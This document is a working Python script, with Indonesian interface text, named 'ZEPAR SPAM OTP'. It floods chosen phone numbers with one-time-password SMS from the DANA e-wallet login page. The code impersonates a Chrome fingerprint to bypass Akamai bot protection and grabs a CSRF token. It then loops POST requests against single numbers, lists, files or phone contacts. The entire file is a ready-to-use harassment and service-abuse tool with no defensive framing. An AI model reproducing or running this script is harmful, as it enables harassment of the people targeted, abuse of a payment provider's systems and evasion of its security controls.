#!/usr/bin/python
import json,time,sys,os,re
from curl_cffi import requests
from bs4 import BeautifulSoup

# -----------------------------------------------------------
# Nama Tool: ZEPAR SPAM OTP
# Creator: Zepar
# Feature: DANA OTP Spam via IPG + curl_cffi (Akamai Bypass)
# ---------------------------------------------------------------

p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'

# Fingerprint Chrome asli untuk bypass Akamai
IMPERSONATE = "chrome120"  # Bisa juga: chrome110, chrome116, chrome120, edge101, safari15_5

class ZeparSpam:
    def __init__(self, nomer):
        self.nomer = nomer
        self.session = requests.Session(impersonate=IMPERSONATE)
        
    def _get_headers(self, referer=None):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        if referer:
            headers['Referer'] = referer
        return headers
    
    def _get_akamai_cookies(self):
        url = 'https://www.dana.id/n/ipg/new/inputphone?phoneNumber=&ipgForwardUrl=%2Fgames%2Fhome&isFromItemDigital=true&trackId=df2fe942ab1409a3'
        try:
            resp = self.session.get(url, headers=self._get_headers(), timeout=30)
            if resp.status_code == 200:
                # Ambil token dari halaman jika ada
                soup = BeautifulSoup(resp.text, 'html.parser')
                csrf = soup.find('input', {'name': 'csrf_token'})
                self.csrf_token = csrf.get('value') if csrf else None
                return True
            return False
        except Exception as e:
            print(f"Debug: {str(e)[:50]}")
            return False
    
    def dana_spam(self):
        nomor_bersih = self.nomer
        if nomor_bersih.startswith('+62'):
            nomor_bersih = nomor_bersih[3:]
        elif nomor_bersih.startswith('0'):
            nomor_bersih = nomor_bersih[1:]
        
        # Step 1: Ambil cookies Akamai dengan fingerprint asli
        if not self._get_akamai_cookies():
            return f'\x1b[91m[FAIL] Zepar DANA -> {self.nomer} Gagal load page / Akamai detect'
        
        time.sleep(1)
        
        # Step 2: Kirim POST request untuk trigger OTP
        post_url = 'https://www.dana.id/n/ipg/new/inputphone'
        headers_post = self._get_headers('https://www.dana.id/n/ipg/new/inputphone?phoneNumber=&ipgForwardUrl=%2Fgames%2Fhome&isFromItemDigital=true&trackId=df2fe942ab1409a3')
        headers_post['Content-Type'] = 'application/x-www-form-urlencoded'
        headers_post['Origin'] = 'https://www.dana.id'
        
        data = {
            'phoneNumber': nomor_bersih,
            'ipgForwardUrl': '/games/home',
            'isFromItemDigital': 'true',
            'trackId': 'df2fe942ab1409a3'
        }
        if hasattr(self, 'csrf_token') and self.csrf_token:
            data['csrf_token'] = self.csrf_token
        
        try:
            req = self.session.post(post_url, headers=headers_post, data=data, timeout=30, allow_redirects=True)
            
            # Analisa response
            response_text = req.text.lower()
            
            if 'verificationcode' in response_text or 'otp' in response_text:
                return f'\x1b[92m[SUCCESS] Zepar DANA -> {self.nomer} OTP Terkirim'
            elif 'terlalu banyak' in response_text or 'limit' in response_text:
                return f'\x1b[91m[FAIL] Zepar DANA -> {self.nomer} Limit 3x'
            elif 'akamai' in response_text or 'access denied' in response_text:
                return f'\x1b[91m[FAIL] Zepar DANA -> {self.nomer} Akamai Block (coba ganti impersonate)'
            elif 'success' in response_text or 'berhasil' in response_text:
                return f'\x1b[92m[SUCCESS] Zepar DANA -> {self.nomer} OTP Terkirim'
            else:
                return f'\x1b[91m[FAIL] Zepar DANA -> {self.nomer} Status: {req.status_code}'
                
        except Exception as e:
            return f'\x1b[91m[FAIL] Zepar DANA -> {self.nomer} Error: {str(e)[:50]}'

# ---------------------------Fungsi Utama---------------------------
def apakah():
    while True:
        lan = str(input(k + '\tIngin lanjut? y/n : ' + h))
        if lan.lower() == 'y':
            menu_utama()
        elif lan.lower() == 'n':
            print(p + '\n\tTerima kasih telah menggunakan Zepar DANA Spam')
            break
        else:
            continue

def single():
    nomer = str(input(k + '\tNomor target (81234567890) : ' + h))
    jm = int(input(k + '\tJumlah spam : ' + h))
    dly = int(input(k + '\tJeda (detik) : ' + h))
    print('\n')
    for oo in range(jm):
        z = ZeparSpam(nomer)
        print('\t' + z.dana_spam())
        time.sleep(dly)
    apakah()

def multi():
    daftar_nomer = []
    jum = int(input(k + '\tJumlah nomor : ' + h))
    for i in range(jum):
        daftar_nomer.append(str(input(k + f'\tNomor ke-{i+1} : ' + h)))
    spm = int(input(k + '\tJumlah spam per nomor : ' + h))
    dly = int(input(k + '\tJeda (detik) : ' + h))
    print('\n')
    for i in range(spm):
        for nomor in daftar_nomer:
            z = ZeparSpam(nomor)
            print('\t' + z.dana_spam())
        time.sleep(dly)
    apakah()

def dari_file():
    fil = str(input(k + '\tNama file : ' + h))
    if fil in os.listdir(os.getcwd()):
        nomor_list = open(fil, 'r').readlines()
        js = int(input(k + '\tJumlah spam per nomor : ' + h))
        dly = int(input(k + '\tJeda (detik) : ' + h))
        print('\n')
        for _ in range(js):
            for line in nomor_list:
                nomor = line.strip()
                if nomor:
                    z = ZeparSpam(nomor)
                    print('\t' + z.dana_spam())
            time.sleep(dly)
        apakah()
    else:
        print(m + f'\tFile {fil} tidak ditemukan')

def dari_kontak():
    os.system('termux-contact-list > .zepar_contact')
    kontak = json.loads(open('.zepar_contact', 'r').read())
    for idx, org in enumerate(kontak):
        print(m + str(idx+1) + ' ' + k + org['name'])
    pilih = int(input(u + '\tPilih nomor > ' + h)) - 1
    target = kontak[pilih]['number']
    target = re.sub(r'[^0-9]', '', target)
    if target.startswith('62'):
        target = target[2:]
    dly = int(input(u + '\tJeda (detik) > ' + h))
    jumlah = int(input(u + '\tJumlah spam : ' + h))
    print('\n')
    for _ in range(jumlah):
        z = ZeparSpam(target)
        print('\t' + z.dana_spam())
        time.sleep(dly)
    apakah()

def banner():
    os.system('clear')
    print('''
\x1b[94m
╔═══════════════════════════════════════╗
║                                       ║
║   ███████╗███████╗██████╗  █████╗ ██████║
║   ╚══███╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗
║     ███╔╝ █████╗  ██████╔╝███████║██████╔╝
║    ███╔╝  ██╔══╝  ██╔═══╝ ██╔══██║██╔══██╗
║    ███████╗███████╗██║     ██║  ██║██║  ██║
║    ╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
║                                       ║
║         SPAM OTP - DANA               ║
║    (curl_cffi - Akamai Bypass)        ║
║         Creator: Zepar                ║
╚═══════════════════════════════════════╝
\x1b[0m''')

def menu_utama():
    banner()
    print(b + '╔════════════════════════════════════╗')
    print(b + '║' + h + '       ZEPAR DANA SPAM (IPG)        ' + b + '║')
    print(b + '╠════════════════════════════════════╣')
    print(b + '║' + m + '  [1] ' + bm + 'Single Target                ' + b + '║')
    print(b + '║' + m + '  [2] ' + bm + 'Multi Target                 ' + b + '║')
    print(b + '║' + m + '  [3] ' + bm + 'Dari File                    ' + b + '║')
    print(b + '║' + m + '  [4] ' + bm + 'Dari Kontak (Termux)         ' + b + '║')
    print(b + '║' + m + '  [0] ' + bm + 'Keluar                       ' + b + '║')
    print(b + '╚════════════════════════════════════╝')
    
    pilih = str(input(b + '╚═► ' + u + 'Pilih' + m + ' : ' + h))
    
    if pilih == '1':
        single()
    elif pilih == '2':
        multi()
    elif pilih == '3':
        dari_file()
    elif pilih == '4':
        dari_kontak()
    elif pilih == '0':
        sys.exit()
    else:
        print(m + '             Pilihan salah')
        time.sleep(1)
        menu_utama()

if __name__ == '__main__':
    menu_utama()
